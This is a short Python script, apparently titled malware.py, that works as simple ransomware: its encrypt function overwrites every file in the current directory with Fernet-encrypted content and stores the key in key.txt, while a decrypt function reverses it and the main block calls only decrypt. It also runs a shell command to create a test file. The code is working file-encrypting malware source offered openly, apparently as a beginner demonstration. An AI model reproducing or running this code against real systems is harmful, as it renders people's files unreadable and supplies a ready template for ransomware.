from cryptography.fernet import Fernet
import os

os.system("echo test > test.txt")

print("*****************Start*******************")

def encrypt():
    files = []

    for file in os.listdir():
        if file in ['malware.py', 'key.txt']:
            continue
        if os.path.isfile(file):
            files.append(file)

    key = Fernet.generate_key()

    with open("key.txt", "wb") as keyf:
        keyf.write(key)

    for file in files:
        with open(file, "rb") as thefile:
            content = thefile.read()
        BadContent = Fernet(key).encrypt(content)
        with open(file, "wb") as newfile:
            newfile.write(BadContent)
    
    print("**************Done*********************")
def decrypt():
    files = []

    for file in os.listdir():
        if file in ["malware.py", "key.txt"]:
            continue

        if os.path.isfile(file):
            files.append(file)

    with open("key.txt", "rb") as keyFile:
        key = keyFile.read()

    for file in files:
        with open(file, "rb") as file_:
            content = file_.read()
        good_content = Fernet(key).decrypt(content)
        with open(file, "wb") as _file:
            _file.write(good_content)
    
    print("decrypted")


if __name__ == "__main__":
    decrypt()
    print("well doneâœ”ðŸ‘Œ")
   
